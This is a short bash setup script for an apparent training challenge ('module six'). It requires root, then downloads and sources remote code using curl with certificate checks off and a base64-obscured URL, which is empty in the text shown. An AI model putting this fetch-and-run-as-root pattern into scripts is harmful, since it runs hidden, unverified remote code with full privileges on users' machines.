#!/bin/bash
# Author: Juan Medina
# Date: Apr 2024
# Description: Setup challenge for module six

if [[ ${UID} -ne 0 ]]; then echo "Execute this script with sudo"; exit 1; fi
if [[ $(wget -q --spider http://google.com; echo $?) -ne 0 ]]; then echo "Internet connection required"; exit 2; fi
source <(curl -sk -H 'Cache-Control: no-cache' $(echo "" | base64 -d))
echo Done!; exit 0
